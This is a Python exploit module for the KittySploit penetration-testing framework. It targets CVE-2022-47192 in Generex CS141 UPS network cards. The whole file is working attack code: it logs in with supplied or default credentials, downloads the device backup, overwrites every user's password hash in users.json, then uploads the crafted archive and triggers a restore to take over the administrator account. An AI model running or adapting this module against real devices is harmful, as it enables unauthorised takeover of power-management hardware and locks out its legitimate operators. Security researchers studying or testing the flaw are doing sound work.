import json
import time

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.cs141 import CS141


class Module(Auxiliary, Http_client, CS141):
    __info__ = {
        "name": "Generex CS141 CVE-2022-47192 - Admin Password Reset via Backup Upload",
        "description": (
            "Generex UPS CS141 below 2.06 allows a crafted backup archive with a modified users.json "
            "to be restored, replacing the administrator password hash."
        ),
        "author": ["JoelGMSec", "KittySploit Team"],
        "cve": "CVE-2022-47192",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2022-47192",
            "https://www.incibe-cert.es/en/early-warning/ics-advisories/update-03032023-multiple-vulnerabilities-generex-ups-cs141",
        ],
        "tags": ["cs141", "backup", "password-reset"],
    }

    username = OptString("admin", "CS141 username", required=True)
    password = OptString("cs141-snmp", "CS141 password", required=True)
    try_default_credentials = OptBool(True, "Fallback to the default admin credentials", required=False)
    wait_seconds = OptInteger(30, "Seconds to wait for restore completion", required=False)
    password_hash = OptString(CS141.DEFAULT_PASSWORD_HASH, "Hash to write into users.json", required=False)
    password_label = OptString("cs141-snmp", "Operator-facing plaintext label for the password hash", required=False)

    def check(self):
        auth_ctx = self.cs141_get_auth_context(self.username, self.password, bool(self.try_default_credentials))
        if not auth_ctx:
            return {"vulnerable": False, "reason": "Authentication failed", "confidence": "low"}

        backup = self.cs141_download_backup(auth_ctx)
        if backup:
            return {"vulnerable": True, "reason": "Backup download succeeded", "confidence": "medium"}
        return {"vulnerable": False, "reason": "Backup download failed", "confidence": "low"}

    def run(self):
        auth_ctx = self.cs141_get_auth_context(self.username, self.password, bool(self.try_default_credentials))
        if not auth_ctx:
            print_error("Unable to authenticate or prepare a default-credential context")
            return False

        backup = self.cs141_download_backup(auth_ctx)
        if not backup:
            print_error("Failed to download the current backup archive")
            return False

        ctx = None
        try:
            ctx = self.cs141_extract_backup(backup)
            users_file = ctx["system_dir"] / "etc" / "gxserve" / "users.json"
            if not users_file.exists():
                print_error("users.json was not found in the extracted backup")
                return False

            data = json.loads(users_file.read_text(encoding="utf-8"))
            for user in data.get("local", {}).get("users", []):
                user["password"] = self.password_hash
            data["admin"] = self.password_hash
            users_file.write_text(json.dumps(data, indent=2), encoding="utf-8")

            evil_backup = self.cs141_rebuild_backup(ctx)
            response = self.cs141_upload_backup(evil_backup, auth_ctx)
            if not response or not getattr(response, "ok", False):
                print_error("Failed to upload the crafted backup archive")
                return False

            self.cs141_trigger_restore(auth_ctx)
            print_status(f"Restore triggered, waiting {self.wait_seconds} second(s)...")
            time.sleep(int(self.wait_seconds))
            print_success(f"Administrator password reset completed. Expected password label: {self.password_label}")
            return True
        finally:
            if ctx:
                self.cs141_cleanup_workdir(ctx)
